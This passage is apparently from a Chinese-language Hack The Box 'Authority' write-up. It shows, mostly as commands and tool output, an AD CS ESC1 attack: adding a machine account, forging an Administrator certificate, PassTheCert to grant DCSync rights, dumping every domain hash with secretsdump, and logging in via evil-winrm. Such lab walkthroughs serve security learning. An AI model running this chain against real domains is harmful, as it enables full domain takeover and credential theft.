+</span></span><span class="line"><span class="cl">ADCS        10.10.11.222    <span class="m">389</span>    AUTHORITY        Found CN: AUTHORITY-CA
+</span></span></code></pre></div><p>发现CA证书，使用<code>certipy-ad</code>寻找利用点</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">certipy-ad find -u <span class="s1">&#39;svc_ldap&#39;</span> -p <span class="s1">&#39;lDaP_1n_th3_cle4r!&#39;</span> -dc-ip 10.10.11.222 -stdout -vulnerable
+</span></span><span class="line"><span class="cl">Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Finding certificate templates
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found <span class="m">37</span> certificate templates
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Finding certificate authorities
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found <span class="m">1</span> certificate authority
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found <span class="m">13</span> enabled certificate templates
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying to get CA configuration <span class="k">for</span> <span class="s1">&#39;AUTHORITY-CA&#39;</span> via CSRA
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Got error <span class="k">while</span> trying to get CA configuration <span class="k">for</span> <span class="s1">&#39;AUTHORITY-CA&#39;</span> via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying to get CA configuration <span class="k">for</span> <span class="s1">&#39;AUTHORITY-CA&#39;</span> via RRP
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Failed to connect to remote registry. Service should be starting now. Trying again...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Got CA configuration <span class="k">for</span> <span class="s1">&#39;AUTHORITY-CA&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Enumeration output:
+</span></span><span class="line"><span class="cl">Certificate Authorities
+</span></span><span class="line"><span class="cl">  <span class="m">0</span>
+</span></span><span class="line"><span class="cl">    CA Name                             : AUTHORITY-CA
+</span></span><span class="line"><span class="cl">    DNS Name                            : authority.authority.htb
+</span></span><span class="line"><span class="cl">    Certificate Subject                 : <span class="nv">CN</span><span class="o">=</span>AUTHORITY-CA, <span class="nv">DC</span><span class="o">=</span>authority, <span class="nv">DC</span><span class="o">=</span>htb
+</span></span><span class="line"><span class="cl">    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
+</span></span><span class="line"><span class="cl">    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
+</span></span><span class="line"><span class="cl">    Certificate Validity End            : 2123-04-24 01:56:25+00:00
+</span></span><span class="line"><span class="cl">    Web Enrollment                      : Disabled
+</span></span><span class="line"><span class="cl">    User Specified SAN                  : Disabled
+</span></span><span class="line"><span class="cl">    Request Disposition                 : Issue
+</span></span><span class="line"><span class="cl">    Enforce Encryption <span class="k">for</span> Requests     : Enabled
+</span></span><span class="line"><span class="cl">    Permissions
+</span></span><span class="line"><span class="cl">      Owner                             : AUTHORITY.HTB<span class="se">\A</span>dministrators
+</span></span><span class="line"><span class="cl">      Access Rights
+</span></span><span class="line"><span class="cl">        ManageCertificates              : AUTHORITY.HTB<span class="se">\A</span>dministrators
+</span></span><span class="line"><span class="cl">                                          AUTHORITY.HTB<span class="se">\D</span>omain Admins
+</span></span><span class="line"><span class="cl">                                          AUTHORITY.HTB<span class="se">\E</span>nterprise Admins
+</span></span><span class="line"><span class="cl">        ManageCa                        : AUTHORITY.HTB<span class="se">\A</span>dministrators
+</span></span><span class="line"><span class="cl">                                          AUTHORITY.HTB<span class="se">\D</span>omain Admins
+</span></span><span class="line"><span class="cl">                                          AUTHORITY.HTB<span class="se">\E</span>nterprise Admins
+</span></span><span class="line"><span class="cl">        Enroll                          : AUTHORITY.HTB<span class="se">\A</span>uthenticated Users
+</span></span><span class="line"><span class="cl">Certificate Templates
+</span></span><span class="line"><span class="cl">  <span class="m">0</span>
+</span></span><span class="line"><span class="cl">    Template Name                       : CorpVPN
+</span></span><span class="line"><span class="cl">    Display Name                        : Corp VPN
+</span></span><span class="line"><span class="cl">    Certificate Authorities             : AUTHORITY-CA
+</span></span><span class="line"><span class="cl">    Enabled                             : True
+</span></span><span class="line"><span class="cl">    Client Authentication               : True
+</span></span><span class="line"><span class="cl">    Enrollment Agent                    : False
+</span></span><span class="line"><span class="cl">    Any Purpose                         : False
+</span></span><span class="line"><span class="cl">    Enrollee Supplies Subject           : True
+</span></span><span class="line"><span class="cl">    Certificate Name Flag               : EnrolleeSuppliesSubject
+</span></span><span class="line"><span class="cl">    Enrollment Flag                     : AutoEnrollmentCheckUserDsCertificate
+</span></span><span class="line"><span class="cl">                                          PublishToDs
+</span></span><span class="line"><span class="cl">                                          IncludeSymmetricAlgorithms
+</span></span><span class="line"><span class="cl">    Private Key Flag                    : ExportableKey
+</span></span><span class="line"><span class="cl">    Extended Key Usage                  : Encrypting File System
+</span></span><span class="line"><span class="cl">                                          Secure Email
+</span></span><span class="line"><span class="cl">                                          Client Authentication
+</span></span><span class="line"><span class="cl">                                          Document Signing
+</span></span><span class="line"><span class="cl">                                          IP security IKE intermediate
+</span></span><span class="line"><span class="cl">                                          IP security use
+</span></span><span class="line"><span class="cl">                                          KDC Authentication
+</span></span><span class="line"><span class="cl">    Requires Manager Approval           : False
+</span></span><span class="line"><span class="cl">    Requires Key Archival               : False
+</span></span><span class="line"><span class="cl">    Authorized Signatures Required      : <span class="m">0</span>
+</span></span><span class="line"><span class="cl">    Validity Period                     : <span class="m">20</span> years
+</span></span><span class="line"><span class="cl">    Renewal Period                      : <span class="m">6</span> weeks
+</span></span><span class="line"><span class="cl">    Minimum RSA Key Length              : <span class="m">2048</span>
+</span></span><span class="line"><span class="cl">    Permissions
+</span></span><span class="line"><span class="cl">      Enrollment Permissions
+</span></span><span class="line"><span class="cl">        Enrollment Rights               : AUTHORITY.HTB<span class="se">\D</span>omain Computers
+</span></span><span class="line"><span class="cl">                                          AUTHORITY.HTB<span class="se">\D</span>omain Admins
+</span></span><span class="line"><span class="cl">                                          AUTHORITY.HTB<span class="se">\E</span>nterprise Admins
+</span></span><span class="line"><span class="cl">      Object Control Permissions
+</span></span><span class="line"><span class="cl">        Owner                           : AUTHORITY.HTB<span class="se">\A</span>dministrator
+</span></span><span class="line"><span class="cl">        Write Owner Principals          : AUTHORITY.HTB<span class="se">\D</span>omain Admins
+</span></span><span class="line"><span class="cl">                                          AUTHORITY.HTB<span class="se">\E</span>nterprise Admins
+</span></span><span class="line"><span class="cl">                                          AUTHORITY.HTB<span class="se">\A</span>dministrator
+</span></span><span class="line"><span class="cl">        Write Dacl Principals           : AUTHORITY.HTB<span class="se">\D</span>omain Admins
+</span></span><span class="line"><span class="cl">                                          AUTHORITY.HTB<span class="se">\E</span>nterprise Admins
+</span></span><span class="line"><span class="cl">                                          AUTHORITY.HTB<span class="se">\A</span>dministrator
+</span></span><span class="line"><span class="cl">        Write Property Principals       : AUTHORITY.HTB<span class="se">\D</span>omain Admins
+</span></span><span class="line"><span class="cl">                                          AUTHORITY.HTB<span class="se">\E</span>nterprise Admins
+</span></span><span class="line"><span class="cl">                                          AUTHORITY.HTB<span class="se">\A</span>dministrator
+</span></span><span class="line"><span class="cl">    <span class="o">[</span>!<span class="o">]</span> Vulnerabilities
+</span></span><span class="line"><span class="cl">      ESC1                              : <span class="s1">&#39;AUTHORITY.HTB\\Domain Computers&#39;</span> can enroll, enrollee supplies subject and template allows client authentication
+</span></span></code></pre></div><p>发现可以进行<code>ECS1</code>攻击，但是注意到</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Enrollment Rights               : AUTHORITY.HTB\Domain Computers
+</span></span><span class="line"><span class="cl">                                  AUTHORITY.HTB\Domain Admins
+</span></span><span class="line"><span class="cl">                                  AUTHORITY.HTB\Enterprise Admins
+</span></span></code></pre></div><p>我们是<code>Domain Computers</code>并不是<code>Domain Users</code>，并且只是一个普通的域用户</p>
+<p>但是我们可以创建一个计算机账户（域用户通常都会具有创建计算机账户的权限）</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">impacket-addcomputer <span class="s1">&#39;authority.htb&#39;</span>/<span class="s1">&#39;svc_ldap&#39;</span>:<span class="s1">&#39;lDaP_1n_th3_cle4r!&#39;</span> -method LDAPS -computer-name <span class="s1">&#39;ya1orin$&#39;</span> -computer-pass <span class="s1">&#39;Aa123456!&#39;</span> -dc-ip 10.10.11.222
+</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Successfully added machine account ya1orin$ with password Aa123456!.
+</span></span></code></pre></div><p>添加成功，继续使用ECS1提权</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">certipy-ad req -u <span class="s1">&#39;ya1orin$&#39;</span> -p <span class="s1">&#39;Aa123456!&#39;</span> -ca <span class="s1">&#39;AUTHORITY-CA&#39;</span> -dc-ip 10.10.11.222 -template <span class="s1">&#39;CorpVPN &#39;</span> -upn <span class="s1">&#39;Administrator&#39;</span> -debug
+</span></span><span class="line"><span class="cl">Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Generating RSA key
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Requesting certificate via RPC
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Trying to connect to endpoint: ncacn_np:10.10.11.222<span class="o">[</span><span class="se">\p</span>ipe<span class="se">\c</span>ert<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Connected to endpoint: ncacn_np:10.10.11.222<span class="o">[</span><span class="se">\p</span>ipe<span class="se">\c</span>ert<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Successfully requested certificate
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Request ID is <span class="m">3</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Got certificate with UPN <span class="s1">&#39;Administrator&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Certificate has no object SID
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saved certificate and private key to <span class="s1">&#39;administrator.pfx&#39;</span>
+</span></span></code></pre></div><p>先同步一下时间</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ntpdate -s authority.htb
+</span></span></code></pre></div><p>继续攻击</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">certipy-ad auth -pfx administrator.pfx -username Administrator -domain authority.htb -dc-ip 10.10.11.222 -debug
+</span></span><span class="line"><span class="cl">Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using principal: administrator@authority.htb
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying to get TGT...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Got error <span class="k">while</span> trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP<span class="o">(</span>KDC has no support <span class="k">for</span> padata <span class="nb">type</span><span class="o">)</span>
+</span></span></code></pre></div><p>注意到有个<code>KDC_ERR_PADATA_TYPE_NOSUPP</code>报错</p>
+<blockquote>
+<p>参考链接：https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d</p>
+</blockquote>
+<p>查阅资料后得知，当域控制器没有为智能卡安装证书时会发生这种情况。具体来说，这是因为 DC 没有正确设置 PKINIT，认证将会失败。</p>
+<p>我们得到的证书就没办法获取到hash了</p>
+<p>文章中也提到过解决方案</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250320201749751-1573262318.png" alt="image-20250320201747004"></p>
+<p>可以使用<code>PassTheCert</code>攻击</p>
+<h1 id="passthecert">
+<a class="header-anchor" href="#passthecert"></a>
+PassTheCert
+</h1><p>利用场景：</p>
+<ul>
+<li>
+<p>授予指定用户DCSync权限，需要证书具有对域的 <code>WriteDacl</code> 权限</p>
+</li>
+<li>
+<p>修改机器账户的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性以进行 <code>RBCD</code> 攻击</p>
+</li>
+<li>
+<p>添加一个机器账户</p>
+</li>
+<li>
+<p>修改指定账户的密码，需要证书具有对指定账户的 <code>User-Force-Change-Password</code> 权限</p>
+</li>
+</ul>
+<p>由于我们已经生成了具有 Administrator账户权限的证书。我们可以使用第一种攻击，也就是给指定用户添加DCSync权限。</p>
+<p><code>PassTheCert</code> 使用的认证机制涉及证书的私钥和公钥，这些密钥存储在 <code>.pfx</code> 文件中。</p>
+<p>可以使用 <code>certipy</code> 提取私钥和公钥文件：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">certipy-ad cert -pfx administrator.pfx -nocert -out administrator.key
+</span></span><span class="line"><span class="cl">Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Writing private key to <span class="s1">&#39;administrator.key&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">certipy-ad cert -pfx administrator.pfx -nokey -out administrator.crt
+</span></span><span class="line"><span class="cl">Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Writing certificate and  to <span class="s1">&#39;administrator.crt&#39;</span>
+</span></span></code></pre></div><p>使用 <code>passthecert</code> 攻击，给创建的机器账户添加 <code>DCSync</code> 权限</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">python3 PassTheCert/Python/passthecert.py -dc-ip 10.10.11.222 -crt administrator.crt -key administrator.key -domain authority.htb -port <span class="m">636</span> -action modify_user -target svc_ldap -elevate
+</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Granted user <span class="s1">&#39;svc_ldap&#39;</span> DCSYNC rights!
+</span></span></code></pre></div><p>使用DCSync攻击获取所有域用户的哈希</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">impacket-secretsdump <span class="s1">&#39;authority.htb&#39;</span>/<span class="s1">&#39;svc_ldap&#39;</span>:<span class="s1">&#39;lDaP_1n_th3_cle4r!&#39;</span>@10.10.11.222
+</span></span><span class="line"><span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span>id:rid:lmhash:nthash<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+</span></span><span class="line"><span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed:::
+</span></span><span class="line"><span class="cl">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span class="line"><span class="cl">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bd6bd7fcab60ba569e3ed57c7c322908:::
+</span></span><span class="line"><span class="cl">svc_ldap:1601:aad3b435b51404eeaad3b435b51404ee:6839f4ed6c7e142fed7988a6c5d0c5f1:::
+</span></span><span class="line"><span class="cl">AUTHORITY$:1000:aad3b435b51404eeaad3b435b51404ee:b575dfe6416d270616f91c393c18e61c:::
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Kerberos keys grabbed
+</span></span><span class="line"><span class="cl">Administrator:aes256-cts-hmac-sha1-96:72c97be1f2c57ba5a51af2ef187969af4cf23b61b6dc444f93dd9cd1d5502a81
+</span></span><span class="line"><span class="cl">Administrator:aes128-cts-hmac-sha1-96:b5fb2fa35f3291a1477ca5728325029f
+</span></span><span class="line"><span class="cl">Administrator:des-cbc-md5:8ad3d50efed66b16
+</span></span><span class="line"><span class="cl">krbtgt:aes256-cts-hmac-sha1-96:1be737545ac8663be33d970cbd7bebba2ecfc5fa4fdfef3d136f148f90bd67cb
+</span></span><span class="line"><span class="cl">krbtgt:aes128-cts-hmac-sha1-96:d2acc08a1029f6685f5a92329c9f3161
+</span></span><span class="line"><span class="cl">krbtgt:des-cbc-md5:a1457c268ca11919
+</span></span><span class="line"><span class="cl">svc_ldap:aes256-cts-hmac-sha1-96:3773526dd267f73ee80d3df0af96202544bd2593459fdccb4452eee7c70f3b8a
+</span></span><span class="line"><span class="cl">svc_ldap:aes128-cts-hmac-sha1-96:08da69b159e5209b9635961c6c587a96
+</span></span><span class="line"><span class="cl">svc_ldap:des-cbc-md5:01a8984920866862
+</span></span><span class="line"><span class="cl">AUTHORITY$:aes256-cts-hmac-sha1-96:5e2e6bc11785004bb7cdb803d6e877cf7badaa9b653a6b29ee42abeec5a3c527
+</span></span><span class="line"><span class="cl">AUTHORITY$:aes128-cts-hmac-sha1-96:e2d4b00747cf4f3e1b3765f1b2b38f36
+</span></span><span class="line"><span class="cl">AUTHORITY$:des-cbc-md5:94f83246687c456e
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Cleaning up...
+</span></span></code></pre></div><p>拿到<code>Administrator</code>的<code>hash</code>，使用<code>netexec</code>检验一下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">netexec winrm 10.10.11.222 -u administrator -H aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed
+</span></span><span class="line"><span class="cl">WINRM       10.10.11.222    <span class="m">5985</span>   AUTHORITY        <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span>
+</span></span><span class="line"><span class="cl">WINRM       10.10.11.222    <span class="m">5985</span>   AUTHORITY        <span class="o">[</span>+<span class="o">]</span> authority.htb<span class="se">\a</span>dministrator:6961f422924da90a6928197429eea4ed <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</span></span></code></pre></div><p>使用<code>evil-winrm</code>登录</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">evil-winrm -i 10.10.11.222 -u administrator -H 6961f422924da90a6928197429eea4ed
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Evil-WinRM shell v3.7
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Warning: Remote path completions is disabled due to ruby limitation: undefined method <span class="sb">`</span>quoting_detection_proc<span class="err">&#39;</span> <span class="k">for</span> module Reline
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; whoami
+</span></span><span class="line"><span class="cl">htb<span class="se">\a</span>dministrator
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
+</span></span></code></pre></div><p>登陆成功，在<code>Desktop</code>找到<code>root.txt</code></p></div>
+    <footer class="article-footer"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/windows"
+        rel="tag"
+        >WINDOWS</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/adcs-esc1"
+        rel="tag"
+        >ADCS-ESC1</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/passthecert"
+        rel="tag"
+        >PASSTHECERT</a
+      >
+    </li></ul>
+</footer>
+  </div><nav
+    id="article-nav"
+    aria-label="Article navigation"
+    data-aos="fade-up"
+  ><div class="article-nav-link-wrap left"><img
+              data-src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/covers/default_cover_16.webp"
+              data-sizes="auto"
+              alt="HTB Escape"
+              class="lazyload"
+            /><a
+          href="/post/htb-escape/"
+          aria-label="前一篇:HTB Escape"
+          title="前一篇:HTB Escape"
+        ></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">HTB Escape</h3>
+      </div><div class="article-nav-link-wrap right"><img
+              data-src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/covers/default_cover_142.webp"
+              data-sizes="auto"
+              alt="HTB Certified"
+              class="lazyload"
+            /><a
+          href="/post/htb-certified/"
+          aria-label="后一篇:HTB Certified"
+          title="后一篇:HTB Certified"
+        ></a>
+        <div class="article-nav-caption">后一篇</div>
+        <h3 class="article-nav-title">HTB Certified</h3>
+      </div></nav></article><section id="comments" data-aos="fade-up">
+<div class="comment-header"><h2 class="comment-title">说些什么吧！</h2>
+  <div class="comment-selector">
+    <div class="comment-selector-wrap"><div class="selector-item" data-selector="gitalk">
+          <span>gitalk</span>
+        </div></div>
+  </div>
+</div>
+
+<div class="comment-content"><div class="comment gitalk-comment" data-aos="fade-up"
+     id="gitalk-comment">
+    </div></div>
+</section></section>
+        </div><footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info"><div>
+      <span class="icon-copyright"></span>2025<span class="footer-info-sep rotate"></span>
+      Ya1orin
+    </div><div>
+        基于&nbsp;<a
+          href="https://gohugo.io/"
+          target="_blank"
+          rel="noopener nofollow noreferrer"
+          >Hugo</a
+        >&nbsp; Theme.<a
+          href="https://github.com/D-Sketon/hugo-theme-reimu"
+          target="_blank"
+          rel="noopener nofollow noreferrer"
+          >Reimu</a
+        >
+      </div><div>
+        <span class="icon-brush"
+          >&nbsp;97.1k</span
+        >
+        &nbsp;|&nbsp;
+        <span class="icon-coffee">&nbsp;03:38</span>
+      </div><div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv"
+          >总访问量&nbsp;<span
+            id="busuanzi_value_site_pv"
+          ></span
+        ></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv"
+          >总访客量&nbsp;<span
+            id="busuanzi_value_site_uv"
+          ></span
+        ></span>
+      </div></div>
+</footer>
+<div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div><div id="mask" class="hide"></div>
+      </div><nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap"><div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#知识点">知识点</a></li>
+    <li><a href="#信息收集">信息收集</a></li>
+    <li><a href="#http服务">HTTP服务</a></li>
+    <li><a href="#smb信息收集">SMB信息收集</a></li>
+    <li><a href="#利用ldap捕获密码">利用LDAP捕获密码</a></li>
+    <li><a href="#esc1提权">ESC1提权</a></li>
+    <li><a href="#passthecert">PassTheCert</a></li>
+  </ul>
+</nav>
+</div></div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="Ya1orin"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">Ya1orin</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">43</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>分类</div>
+    <div class="sidebar-state-number">
+      3
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>标签</div>
+    <div class="sidebar-state-number">37</div>
+  </a>
+</div>
+<div class="sidebar-social"><div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/ya1orin"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener nofollow noreferrer"
+      ></a>
+    </div></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首页"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">首页</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="归档"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">归档</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="关于"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">关于</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/friend"
+        aria-label="友链"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">友链</div>
+    </div></div>
+</div></div><div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div></nav>
+</div><div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png" />
+        </div>
+      </div><script
+    src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"
+    integrity="sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf&#43;e" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"
+    integrity="sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script><script src="/js/main.js" ></script><script src="/js/aos.js" ></script><script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", aosInit);
+    } else {
+      aosInit();
+    }
+  </script><script src="/js/pjax_main.js" data-pjax></script><script>
+    var ALGOLIA_CONFIG = {
+      logo: '\/images\/algolia_logo.svg',
+      algolia: {
+        applicationID: "G5DS5ZI3YM",
+        apiKey: "90bf1b7c38d7240c582e5c8a29bff9ab",
+        indexName: "Blog",
+        hits: {
+          "per_page": parseInt("10")
+        },
+        labels: {
+          "input_placeholder": '搜索.....',
+          "hits_empty": '未发现与 「${query}」相关内容',
+          "hits_stats": '找到${hits}条结果（用时 ${time} ms）'
+        }
+      }
+    };
+  </script><script
+    src="https://npm.webcache.cn/algoliasearch@4.17.1/dist/algoliasearch-lite.umd.js"
+    deferintegrity="sha384-xvLS0jfKuoREs7pqkRI/OI8GcqohO5S&#43;jQz7ZBtQXnsXmD&#43;9jDOOY4cL6dCPzlrk" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/@reimujs/instantsearch.js@4.57.0-beta.1/dist/instantsearch.production.min.js"
